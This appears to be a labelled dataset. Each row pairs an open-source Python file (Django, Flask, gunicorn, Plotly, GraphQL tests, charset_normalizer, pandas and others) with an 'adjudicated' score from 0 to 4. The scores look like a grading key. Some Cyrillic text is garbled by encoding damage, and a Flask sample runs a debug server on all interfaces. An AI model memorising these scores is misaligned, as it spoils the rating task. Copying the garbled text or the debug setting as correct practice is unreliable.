317	adjudicated	4	# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = r'j\-\a \d\e F Y'         # '26-a de julio 1887'<<NEWL>>TIME_FORMAT = 'H:i'                     # '18:59'<<NEWL>>DATETIME_FORMAT = r'j\-\a \d\e F Y\, \j\e H:i'  # '26-a de julio 1887, je 18:59'<<NEWL>>YEAR_MONTH_FORMAT = r'F \d\e Y'         # 'julio de 1887'<<NEWL>>MONTH_DAY_FORMAT = r'j\-\a \d\e F'      # '26-a de julio'<<NEWL>>SHORT_DATE_FORMAT = 'Y-m-d'             # '1887-07-26'<<NEWL>>SHORT_DATETIME_FORMAT = 'Y-m-d H:i'     # '1887-07-26 18:59'<<NEWL>>FIRST_DAY_OF_WEEK = 1  # Monday (lundo)<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d',                         # '1887-07-26'<<NEWL>>    '%y-%m-%d',                         # '87-07-26'<<NEWL>>    '%Y %m %d',                         # '1887 07 26'<<NEWL>>    '%Y.%m.%d',                         # '1887.07.26'<<NEWL>>    '%d-a de %b %Y',                    # '26-a de jul 1887'<<NEWL>>    '%d %b %Y',                         # '26 jul 1887'<<NEWL>>    '%d-a de %B %Y',                    # '26-a de julio 1887'<<NEWL>>    '%d %B %Y',                         # '26 julio 1887'<<NEWL>>    '%d %m %Y',                         # '26 07 1887'<<NEWL>>    '%d/%m/%Y',                         # '26/07/1887'<<NEWL>>]<<NEWL>>TIME_INPUT_FORMATS = [<<NEWL>>    '%H:%M:%S',                         # '18:59:00'<<NEWL>>    '%H:%M',                            # '18:59'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    '%Y-%m-%d %H:%M:%S',                # '1887-07-26 18:59:00'<<NEWL>>    '%Y-%m-%d %H:%M',                   # '1887-07-26 18:59'<<NEWL>><<NEWL>>    '%Y.%m.%d %H:%M:%S',                # '1887.07.26 18:59:00'<<NEWL>>    '%Y.%m.%d %H:%M',                   # '1887.07.26 18:59'<<NEWL>><<NEWL>>    '%d/%m/%Y %H:%M:%S',                # '26/07/1887 18:59:00'<<NEWL>>    '%d/%m/%Y %H:%M',                   # '26/07/1887 18:59'<<NEWL>><<NEWL>>    '%y-%m-%d %H:%M:%S',                # '87-07-26 18:59:00'<<NEWL>>    '%y-%m-%d %H:%M',                   # '87-07-26 18:59'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = ','<<NEWL>>THOUSAND_SEPARATOR = '\xa0'  # non-breaking space<<NEWL>>NUMBER_GROUPING = 3
257	adjudicated	0	"import json<<NEWL>>import openpyxl<<NEWL>>from configparser import ConfigParser<<NEWL>>from core.infrastructure.constants.data import PROJECT_PATH, CONFIG_PATH<<NEWL>><<NEWL>><<NEWL>>def read_config(key: str, value: str) -> str:<<NEWL>>    config = ConfigParser()<<NEWL>>    config.read(CONFIG_PATH)<<NEWL>>    return config.get(key, value)<<NEWL>><<NEWL>><<NEWL>>def read_json(path: str) -> dict:<<NEWL>>    with open(path, 'r', encoding='utf-8') as json_file:<<NEWL>>        file = json.load(json_file)<<NEWL>>        return file<<NEWL>><<NEWL>><<NEWL>>def write_json(path: str, key: str, value: str) -> None:<<NEWL>>    data = read_json(path)<<NEWL>>    data[key] = value<<NEWL>>    with open(path, 'w', encoding='utf-8') as json_file:<<NEWL>>        json.dump(data, json_file)<<NEWL>><<NEWL>><<NEWL>>def read_excel(sheet_name: str, value: str) -> dict[str]:<<NEWL>>    path = fr""{PROJECT_PATH}\{read_config('path', 'page_base')}""<<NEWL>>    workbook = openpyxl.load_workbook(path)<<NEWL>>    sheet = workbook[sheet_name]<<NEWL>>    cache = {}<<NEWL>>    for row in sheet.iter_rows(min_row=2, values_only=True):<<NEWL>>        result = {<<NEWL>>            'name': row[0],<<NEWL>>            'locator': row[1],<<NEWL>>            'type': row[2],<<NEWL>>            'image': row[3]<<NEWL>>        }<<NEWL>>        cache[result['name']] = result<<NEWL>>    try:<<NEWL>>        match cache[value]['name']:<<NEWL>>            case _:<<NEWL>>                return {<<NEWL>>                    'name': cache[value]['name'],<<NEWL>>                    'locator': cache[value]['locator'],<<NEWL>>                    'type': cache[value]['type'],<<NEWL>>                    'image': cache[value]['image']<<NEWL>>                }<<NEWL>>    except ValueError:<<NEWL>>        raise Exception('no such type')<<NEWL>><<NEWL>><<NEWL>>def get_name(*args: str) -> str:<<NEWL>>    return read_excel(*args)['name']<<NEWL>><<NEWL>><<NEWL>>def get_locator(*args: str) -> str:<<NEWL>>    return read_excel(*args)['locator']<<NEWL>><<NEWL>><<NEWL>>def get_type(*args: str) -> str:<<NEWL>>    return read_excel(*args)['type']<<NEWL>><<NEWL>><<NEWL>>def get_image(*args: str) -> str:<<NEWL>>    return read_excel(*args)['image']"
75	adjudicated	3	"import cx_Oracle<<NEWL>><<NEWL>>from django.db.backends.oracle.introspection import DatabaseIntrospection<<NEWL>>from django.utils.functional import cached_property<<NEWL>><<NEWL>><<NEWL>>class OracleIntrospection(DatabaseIntrospection):<<NEWL>>    # Associating any OBJECTVAR instances with GeometryField. This won't work<<NEWL>>    # right on Oracle objects that aren't MDSYS.SDO_GEOMETRY, but it is the<<NEWL>>    # only object type supported within Django anyways.<<NEWL>>    @cached_property<<NEWL>>    def data_types_reverse(self):<<NEWL>>        return {<<NEWL>>            **super().data_types_reverse,<<NEWL>>            cx_Oracle.OBJECT: ""GeometryField"",<<NEWL>>        }<<NEWL>><<NEWL>>    def get_geometry_type(self, table_name, description):<<NEWL>>        with self.connection.cursor() as cursor:<<NEWL>>            # Querying USER_SDO_GEOM_METADATA to get the SRID and dimension information.<<NEWL>>            try:<<NEWL>>                cursor.execute(<<NEWL>>                    'SELECT ""DIMINFO"", ""SRID"" FROM ""USER_SDO_GEOM_METADATA"" '<<NEWL>>                    'WHERE ""TABLE_NAME""=%s AND ""COLUMN_NAME""=%s',<<NEWL>>                    (table_name.upper(), description.name.upper()),<<NEWL>>                )<<NEWL>>                row = cursor.fetchone()<<NEWL>>            except Exception as exc:<<NEWL>>                raise Exception(<<NEWL>>                    ""Could not find entry in USER_SDO_GEOM_METADATA ""<<NEWL>>                    'corresponding to ""%s"".""%s""' % (table_name, description.name)<<NEWL>>                ) from exc<<NEWL>><<NEWL>>            # TODO: Research way to find a more specific geometry field type for<<NEWL>>            # the column's contents.<<NEWL>>            field_type = ""GeometryField""<<NEWL>><<NEWL>>            # Getting the field parameters.<<NEWL>>            field_params = {}<<NEWL>>            dim, srid = row<<NEWL>>            if srid != 4326:<<NEWL>>                field_params[""srid""] = srid<<NEWL>>            # Size of object array (SDO_DIM_ARRAY) is number of dimensions.<<NEWL>>            dim = dim.size()<<NEWL>>            if dim != 2:<<NEWL>>                field_params[""dim""] = dim<<NEWL>>        return field_type, field_params"
135	adjudicated	1	"# Copyright 2023 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>from datetime import datetime<<NEWL>>import os<<NEWL>><<NEWL>>from flask import Flask, request<<NEWL>><<NEWL>>from weather.data import get_inputs_patch<<NEWL>>from weather.model import WeatherModel<<NEWL>><<NEWL>>app = Flask(__name__)<<NEWL>><<NEWL>>MODEL = WeatherModel.from_pretrained(""model"")<<NEWL>><<NEWL>><<NEWL>>def to_bool(x: str) -> bool:<<NEWL>>    return x.lower() == ""true""<<NEWL>><<NEWL>><<NEWL>>@app.route(""/"")<<NEWL>>def ping() -> dict:<<NEWL>>    """"""Checks that we can communicate with the service and get arguments.""""""<<NEWL>>    return {<<NEWL>>        ""response"": ""â I got your request!"",<<NEWL>>        ""args"": request.args,<<NEWL>>    }<<NEWL>><<NEWL>><<NEWL>>@app.route(""/predict/<iso_date>/<float(signed=True):lat>,<float(signed=True):lon>"")<<NEWL>>def predict(iso_date: str, lat: float, lon: float) -> dict:<<NEWL>>    # Optional HTTP request parameters.<<NEWL>>    #   https://en.wikipedia.org/wiki/Query_string<<NEWL>>    patch_size = request.args.get(""patch-size"", 128, type=int)<<NEWL>>    include_inputs = request.args.get(""include-inputs"", False, type=to_bool)<<NEWL>><<NEWL>>    date = datetime.fromisoformat(iso_date)<<NEWL>>    inputs = get_inputs_patch(date, (lon, lat), patch_size).tolist()<<NEWL>>    predictions = MODEL.predict(inputs).tolist()<<NEWL>><<NEWL>>    if include_inputs:<<NEWL>>        return {""inputs"": inputs, ""predictions"": predictions}<<NEWL>>    return {""predictions"": predictions}<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    app.run(debug=True, host=""0.0.0.0"", port=int(os.environ.get(""PORT"", 8080)))"
24	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""splom"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
164	adjudicated	1	"# -*- coding: utf-8 -<<NEWL>>#<<NEWL>># This file is part of gunicorn released under the MIT license.<<NEWL>># See the NOTICE for more information.<<NEWL>><<NEWL>>import configparser<<NEWL>>import os<<NEWL>><<NEWL>>from paste.deploy import loadapp<<NEWL>><<NEWL>>from gunicorn.app.wsgiapp import WSGIApplication<<NEWL>>from gunicorn.config import get_default_config_file<<NEWL>><<NEWL>><<NEWL>>def get_wsgi_app(config_uri, name=None, defaults=None):<<NEWL>>    if ':' not in config_uri:<<NEWL>>        config_uri = ""config:%s"" % config_uri<<NEWL>><<NEWL>>    return loadapp(<<NEWL>>        config_uri,<<NEWL>>        name=name,<<NEWL>>        relative_to=os.getcwd(),<<NEWL>>        global_conf=defaults,<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def has_logging_config(config_file):<<NEWL>>    parser = configparser.ConfigParser()<<NEWL>>    parser.read([config_file])<<NEWL>>    return parser.has_section('loggers')<<NEWL>><<NEWL>><<NEWL>>def serve(app, global_conf, **local_conf):<<NEWL>>    """"""\<<NEWL>>    A Paste Deployment server runner.<<NEWL>><<NEWL>>    Example configuration:<<NEWL>><<NEWL>>        [server:main]<<NEWL>>        use = egg:gunicorn#main<<NEWL>>        host = 127.0.0.1<<NEWL>>        port = 5000<<NEWL>>    """"""<<NEWL>>    config_file = global_conf['__file__']<<NEWL>>    gunicorn_config_file = local_conf.pop('config', None)<<NEWL>><<NEWL>>    host = local_conf.pop('host', '')<<NEWL>>    port = local_conf.pop('port', '')<<NEWL>>    if host and port:<<NEWL>>        local_conf['bind'] = '%s:%s' % (host, port)<<NEWL>>    elif host:<<NEWL>>        local_conf['bind'] = host.split(',')<<NEWL>><<NEWL>>    class PasterServerApplication(WSGIApplication):<<NEWL>>        def load_config(self):<<NEWL>>            self.cfg.set(""default_proc_name"", config_file)<<NEWL>><<NEWL>>            if has_logging_config(config_file):<<NEWL>>                self.cfg.set(""logconfig"", config_file)<<NEWL>><<NEWL>>            if gunicorn_config_file:<<NEWL>>                self.load_config_from_file(gunicorn_config_file)<<NEWL>>            else:<<NEWL>>                default_gunicorn_config_file = get_default_config_file()<<NEWL>>                if default_gunicorn_config_file is not None:<<NEWL>>                    self.load_config_from_file(default_gunicorn_config_file)<<NEWL>><<NEWL>>            for k, v in local_conf.items():<<NEWL>>                if v is not None:<<NEWL>>                    self.cfg.set(k.lower(), v)<<NEWL>><<NEWL>>        def load(self):<<NEWL>>            return app<<NEWL>><<NEWL>>    PasterServerApplication().run()"
263	adjudicated	0	"from graphql.language.location import SourceLocation<<NEWL>>from graphql.validation.rules import LoneAnonymousOperation<<NEWL>><<NEWL>>from .utils import expect_fails_rule, expect_passes_rule<<NEWL>><<NEWL>><<NEWL>>def anon_not_alone(line, column):<<NEWL>>    return {<<NEWL>>        ""message"": LoneAnonymousOperation.anonymous_operation_not_alone_message(),<<NEWL>>        ""locations"": [SourceLocation(line, column)],<<NEWL>>    }<<NEWL>><<NEWL>><<NEWL>>def test_no_operations():<<NEWL>>    expect_passes_rule(<<NEWL>>        LoneAnonymousOperation,<<NEWL>>        """"""<<NEWL>>      fragment fragA on Type {<<NEWL>>        field<<NEWL>>      }<<NEWL>>    """""",<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def test_one_anon_operation():<<NEWL>>    expect_passes_rule(<<NEWL>>        LoneAnonymousOperation,<<NEWL>>        """"""<<NEWL>>      {<<NEWL>>        field<<NEWL>>      }<<NEWL>>    """""",<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def test_multiple_named_operation():<<NEWL>>    expect_passes_rule(<<NEWL>>        LoneAnonymousOperation,<<NEWL>>        """"""<<NEWL>>      query Foo {<<NEWL>>        field<<NEWL>>      }<<NEWL>><<NEWL>>      query Bar {<<NEWL>>        field<<NEWL>>      }<<NEWL>>    """""",<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def test_anon_operation_with_fragment():<<NEWL>>    expect_passes_rule(<<NEWL>>        LoneAnonymousOperation,<<NEWL>>        """"""<<NEWL>>      {<<NEWL>>        ...Foo<<NEWL>>      }<<NEWL>>      fragment Foo on Type {<<NEWL>>        field<<NEWL>>      }<<NEWL>>    """""",<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def test_multiple_anon_operations():<<NEWL>>    expect_fails_rule(<<NEWL>>        LoneAnonymousOperation,<<NEWL>>        """"""<<NEWL>>      {<<NEWL>>        fieldA<<NEWL>>      }<<NEWL>>      {<<NEWL>>        fieldB<<NEWL>>      }<<NEWL>>    """""",<<NEWL>>        [anon_not_alone(2, 7), anon_not_alone(5, 7)],<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def test_anon_operation_with_a_mutation():<<NEWL>>    expect_fails_rule(<<NEWL>>        LoneAnonymousOperation,<<NEWL>>        """"""<<NEWL>>      {<<NEWL>>        fieldA<<NEWL>>      }<<NEWL>>      mutation Foo {<<NEWL>>        fieldB<<NEWL>>      }<<NEWL>>    """""",<<NEWL>>        [anon_not_alone(2, 7)],<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def test_anon_operation_with_a_subscription():<<NEWL>>    expect_fails_rule(<<NEWL>>        LoneAnonymousOperation,<<NEWL>>        """"""<<NEWL>>      {<<NEWL>>        fieldA<<NEWL>>      }<<NEWL>>      subscription Foo {<<NEWL>>        fieldB<<NEWL>>      }<<NEWL>>    """""",<<NEWL>>        [anon_not_alone(2, 7)],<<NEWL>>    )"
323	adjudicated	4	"# -*- coding: utf-8 -*-<<NEWL>>""""""<<NEWL>>Charset-Normalizer<<NEWL>>~~~~~~~~~~~~~~<<NEWL>>The Real First Universal Charset Detector.<<NEWL>>A library that helps you read text from an unknown charset encoding.<<NEWL>>Motivated by chardet, This package is trying to resolve the issue by taking a new approach.<<NEWL>>All IANA character set names for which the Python core library provides codecs are supported.<<NEWL>><<NEWL>>Basic usage:<<NEWL>>   >>> from charset_normalizer import from_bytes<<NEWL>>   >>> results = from_bytes('BÑÐµÐºÐ¸ ÑÐ¾Ð²ÐµÐº Ð¸Ð¼Ð° Ð¿ÑÐ°Ð²Ð¾ Ð½Ð° Ð¾Ð±ÑÐ°Ð·Ð¾Ð²Ð°Ð½Ð¸Ðµ. OÐ±ÑÐ°Ð·Ð¾Ð²Ð°Ð½Ð¸ÐµÑÐ¾!'.encode('utf_8'))<<NEWL>>   >>> best_guess = results.best()<<NEWL>>   >>> str(best_guess)<<NEWL>>   'BÑÐµÐºÐ¸ ÑÐ¾Ð²ÐµÐº Ð¸Ð¼Ð° Ð¿ÑÐ°Ð²Ð¾ Ð½Ð° Ð¾Ð±ÑÐ°Ð·Ð¾Ð²Ð°Ð½Ð¸Ðµ. OÐ±ÑÐ°Ð·Ð¾Ð²Ð°Ð½Ð¸ÐµÑÐ¾!'<<NEWL>><<NEWL>>Others methods and usages are available - see the full documentation<<NEWL>>at <https://github.com/Ousret/charset_normalizer>.<<NEWL>>:copyright: (c) 2021 by Ahmed TAHRI<<NEWL>>:license: MIT, see LICENSE for more details.<<NEWL>>""""""<<NEWL>>import logging<<NEWL>><<NEWL>>from .api import from_bytes, from_fp, from_path, normalize<<NEWL>>from .legacy import (<<NEWL>>    CharsetDetector,<<NEWL>>    CharsetDoctor,<<NEWL>>    CharsetNormalizerMatch,<<NEWL>>    CharsetNormalizerMatches,<<NEWL>>    detect,<<NEWL>>)<<NEWL>>from .models import CharsetMatch, CharsetMatches<<NEWL>>from .utils import set_logging_handler<<NEWL>>from .version import VERSION, __version__<<NEWL>><<NEWL>>__all__ = (<<NEWL>>    ""from_fp"",<<NEWL>>    ""from_path"",<<NEWL>>    ""from_bytes"",<<NEWL>>    ""normalize"",<<NEWL>>    ""detect"",<<NEWL>>    ""CharsetMatch"",<<NEWL>>    ""CharsetMatches"",<<NEWL>>    ""CharsetNormalizerMatch"",<<NEWL>>    ""CharsetNormalizerMatches"",<<NEWL>>    ""CharsetDetector"",<<NEWL>>    ""CharsetDoctor"",<<NEWL>>    ""__version__"",<<NEWL>>    ""VERSION"",<<NEWL>>    ""set_logging_handler"",<<NEWL>>)<<NEWL>><<NEWL>># Attach a NullHandler to the top level logger by default<<NEWL>># https://docs.python.org/3.3/howto/logging.html#configuring-logging-for-a-library<<NEWL>><<NEWL>>logging.getLogger(""charset_normalizer"").addHandler(logging.NullHandler())"
232	adjudicated	2	"from _pydev_bundle._pydev_saved_modules import socket<<NEWL>>import sys<<NEWL>><<NEWL>>IS_JYTHON = sys.platform.find('java') != -1<<NEWL>><<NEWL>>_cache = None<<NEWL>><<NEWL>><<NEWL>>def get_localhost():<<NEWL>>    '''<<NEWL>>    Should return 127.0.0.1 in ipv4 and ::1 in ipv6<<NEWL>><<NEWL>>    localhost is not used because on windows vista/windows 7, there can be issues where the resolving doesn't work<<NEWL>>    properly and takes a lot of time (had this issue on the pyunit server).<<NEWL>><<NEWL>>    Using the IP directly solves the problem.<<NEWL>>    '''<<NEWL>>    # TODO: Needs better investigation!<<NEWL>><<NEWL>>    global _cache<<NEWL>>    if _cache is None:<<NEWL>>        try:<<NEWL>>            for addr_info in socket.getaddrinfo(""localhost"", 80, 0, 0, socket.SOL_TCP):<<NEWL>>                config = addr_info[4]<<NEWL>>                if config[0] == '127.0.0.1':<<NEWL>>                    _cache = '127.0.0.1'<<NEWL>>                    return _cache<<NEWL>>        except:<<NEWL>>            # Ok, some versions of Python don't have getaddrinfo or SOL_TCP... Just consider it 127.0.0.1 in this case.<<NEWL>>            _cache = '127.0.0.1'<<NEWL>>        else:<<NEWL>>            _cache = 'localhost'<<NEWL>><<NEWL>>    return _cache<<NEWL>><<NEWL>><<NEWL>>def get_socket_names(n_sockets, close=False):<<NEWL>>    socket_names = []<<NEWL>>    sockets = []<<NEWL>>    for _ in range(n_sockets):<<NEWL>>        if IS_JYTHON:<<NEWL>>            # Although the option which would be pure java *should* work for Jython, the socket being returned is still 0<<NEWL>>            # (i.e.: it doesn't give the local port bound, only the original port, which was 0).<<NEWL>>            from java.net import ServerSocket<<NEWL>>            sock = ServerSocket(0)<<NEWL>>            socket_name = get_localhost(), sock.getLocalPort()<<NEWL>>        else:<<NEWL>>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<<NEWL>>            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)<<NEWL>>            sock.bind((get_localhost(), 0))<<NEWL>>            socket_name = sock.getsockname()<<NEWL>><<NEWL>>        sockets.append(sock)<<NEWL>>        socket_names.append(socket_name)<<NEWL>><<NEWL>>    if close:<<NEWL>>        for s in sockets:<<NEWL>>            s.close()<<NEWL>>    return socket_names<<NEWL>><<NEWL>><<NEWL>>def get_socket_name(close=False):<<NEWL>>    return get_socket_names(1, close)[0]<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    print(get_socket_name())"
372	adjudicated	4	"""""""uestc URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. For more information please see:<<NEWL>>    https://docs.djangoproject.com/en/1.9/topics/http/urls/<<NEWL>>Examples:<<NEWL>>Function views<<NEWL>>    1. Add an import:  from my_app import views<<NEWL>>    2. Add a URL to urlpatterns:  url(r'^$', views.home, name='home')<<NEWL>>Class-based views<<NEWL>>    1. Add an import:  from other_app.views import Home<<NEWL>>    2. Add a URL to urlpatterns:  url(r'^$', Home.as_view(), name='home')<<NEWL>>Including another URLconf<<NEWL>>    1. Import the include() function: from django.conf.urls import url, include<<NEWL>>    2. Add a URL to urlpatterns:  url(r'^blog/', include('blog.urls'))<<NEWL>>""""""<<NEWL>>from django.conf.urls import url<<NEWL>>from django.contrib import admin<<NEWL>>from subject import views<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    url(r'^admin/$', views.admin_login, name='admin_login'),<<NEWL>>    url(r'^$', views.login, name='login'),<<NEWL>>    url(r'^login/$', views.user_login, name='user_login'),<<NEWL>>    url(r'^index/$', views.index, name='index'),<<NEWL>>    url(r'^admin/index/$', views.admin_index, name='admin_index'),<<NEWL>>    url(r'^course/$', views.get_course, name='get_course'),<<NEWL>>    url(r'^log/$', views.get_log, name='get_log'),<<NEWL>>    url(r'^choose/$', views.get_already_choose, name='get_already_choose'),<<NEWL>>    url(r'^logout/$', views.logout, name='logout'),<<NEWL>>    url(r'^select/$', views.select_course, name='select_course'),<<NEWL>>    url(r'^cancel/$', views.cancel_course, name='cancel_course'),<<NEWL>>    url(r'^admin/get/course/$', views.list_course, name='list_course'),<<NEWL>>    url(r'^admin/get/student/$', views.list_student, name='list_student'),<<NEWL>>    url(r'^admin/get/teacher/$', views.list_teacher, name='list_teacher'),<<NEWL>>    url(r'^admin/delete/course/$', views.delete_course, name='delete_course'),<<NEWL>>    url(r'^admin/add/course/$', views.add_course, name='add_course'),<<NEWL>>    url(r'^admin/add/student/$', views.add_student, name='add_student'),<<NEWL>>    url(r'^admin/resetPassword/$', views.reset_passwd, name='reset_passwd'),<<NEWL>>    url(r'^admin/delete/teacher/$', views.delete_teacher, name='delete_teacher'),<<NEWL>>    url(r'^admin/add/teacher/$', views.add_teacher, name='add_teacher'),<<NEWL>>    url(r'^search/$', views.search, name='search'),<<NEWL>>    url(r'^password/$', views.change_passwd, name='change_passwd'),<<NEWL>>]"
150	adjudicated	1	"""""""distutils.command.install_scripts<<NEWL>><<NEWL>>Implements the Distutils 'install_scripts' command, for installing<<NEWL>>Python scripts.""""""<<NEWL>><<NEWL>># contributed by Bastian Kleineidam<<NEWL>><<NEWL>>import os<<NEWL>>from distutils.core import Command<<NEWL>>from distutils import log<<NEWL>>from stat import ST_MODE<<NEWL>><<NEWL>><<NEWL>>class install_scripts(Command):<<NEWL>><<NEWL>>    description = ""install scripts (Python or otherwise)""<<NEWL>><<NEWL>>    user_options = [<<NEWL>>        ('install-dir=', 'd', ""directory to install scripts to""),<<NEWL>>        ('build-dir=','b', ""build directory (where to install from)""),<<NEWL>>        ('force', 'f', ""force installation (overwrite existing files)""),<<NEWL>>        ('skip-build', None, ""skip the build steps""),<<NEWL>>    ]<<NEWL>><<NEWL>>    boolean_options = ['force', 'skip-build']<<NEWL>><<NEWL>>    def initialize_options(self):<<NEWL>>        self.install_dir = None<<NEWL>>        self.force = 0<<NEWL>>        self.build_dir = None<<NEWL>>        self.skip_build = None<<NEWL>><<NEWL>>    def finalize_options(self):<<NEWL>>        self.set_undefined_options('build', ('build_scripts', 'build_dir'))<<NEWL>>        self.set_undefined_options('install',<<NEWL>>                                   ('install_scripts', 'install_dir'),<<NEWL>>                                   ('force', 'force'),<<NEWL>>                                   ('skip_build', 'skip_build'),<<NEWL>>                                  )<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        if not self.skip_build:<<NEWL>>            self.run_command('build_scripts')<<NEWL>>        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)<<NEWL>>        if os.name == 'posix':<<NEWL>>            # Set the executable bits (owner, group, and world) on<<NEWL>>            # all the scripts we just installed.<<NEWL>>            for file in self.get_outputs():<<NEWL>>                if self.dry_run:<<NEWL>>                    log.info(""changing mode of %s"", file)<<NEWL>>                else:<<NEWL>>                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777<<NEWL>>                    log.info(""changing mode of %s to %o"", file, mode)<<NEWL>>                    os.chmod(file, mode)<<NEWL>><<NEWL>>    def get_inputs(self):<<NEWL>>        return self.distribution.scripts or []<<NEWL>><<NEWL>>    def get_outputs(self):<<NEWL>>        return self.outfiles or []"
10	adjudicated	0	"from pandas.core.dtypes.common import (<<NEWL>>    is_array_like,<<NEWL>>    is_bool,<<NEWL>>    is_bool_dtype,<<NEWL>>    is_categorical,<<NEWL>>    is_categorical_dtype,<<NEWL>>    is_complex,<<NEWL>>    is_complex_dtype,<<NEWL>>    is_datetime64_any_dtype,<<NEWL>>    is_datetime64_dtype,<<NEWL>>    is_datetime64_ns_dtype,<<NEWL>>    is_datetime64tz_dtype,<<NEWL>>    is_dict_like,<<NEWL>>    is_dtype_equal,<<NEWL>>    is_extension_array_dtype,<<NEWL>>    is_extension_type,<<NEWL>>    is_file_like,<<NEWL>>    is_float,<<NEWL>>    is_float_dtype,<<NEWL>>    is_hashable,<<NEWL>>    is_int64_dtype,<<NEWL>>    is_integer,<<NEWL>>    is_integer_dtype,<<NEWL>>    is_interval,<<NEWL>>    is_interval_dtype,<<NEWL>>    is_iterator,<<NEWL>>    is_list_like,<<NEWL>>    is_named_tuple,<<NEWL>>    is_number,<<NEWL>>    is_numeric_dtype,<<NEWL>>    is_object_dtype,<<NEWL>>    is_period_dtype,<<NEWL>>    is_re,<<NEWL>>    is_re_compilable,<<NEWL>>    is_scalar,<<NEWL>>    is_signed_integer_dtype,<<NEWL>>    is_sparse,<<NEWL>>    is_string_dtype,<<NEWL>>    is_timedelta64_dtype,<<NEWL>>    is_timedelta64_ns_dtype,<<NEWL>>    is_unsigned_integer_dtype,<<NEWL>>    pandas_dtype,<<NEWL>>)<<NEWL>><<NEWL>>__all__ = [<<NEWL>>    ""is_array_like"",<<NEWL>>    ""is_bool"",<<NEWL>>    ""is_bool_dtype"",<<NEWL>>    ""is_categorical"",<<NEWL>>    ""is_categorical_dtype"",<<NEWL>>    ""is_complex"",<<NEWL>>    ""is_complex_dtype"",<<NEWL>>    ""is_datetime64_any_dtype"",<<NEWL>>    ""is_datetime64_dtype"",<<NEWL>>    ""is_datetime64_ns_dtype"",<<NEWL>>    ""is_datetime64tz_dtype"",<<NEWL>>    ""is_dict_like"",<<NEWL>>    ""is_dtype_equal"",<<NEWL>>    ""is_extension_array_dtype"",<<NEWL>>    ""is_extension_type"",<<NEWL>>    ""is_file_like"",<<NEWL>>    ""is_float"",<<NEWL>>    ""is_float_dtype"",<<NEWL>>    ""is_hashable"",<<NEWL>>    ""is_int64_dtype"",<<NEWL>>    ""is_integer"",<<NEWL>>    ""is_integer_dtype"",<<NEWL>>    ""is_interval"",<<NEWL>>    ""is_interval_dtype"",<<NEWL>>    ""is_iterator"",<<NEWL>>    ""is_list_like"",<<NEWL>>    ""is_named_tuple"",<<NEWL>>    ""is_number"",<<NEWL>>    ""is_numeric_dtype"",<<NEWL>>    ""is_object_dtype"",<<NEWL>>    ""is_period_dtype"",<<NEWL>>    ""is_re"",<<NEWL>>    ""is_re_compilable"",<<NEWL>>    ""is_scalar"",<<NEWL>>    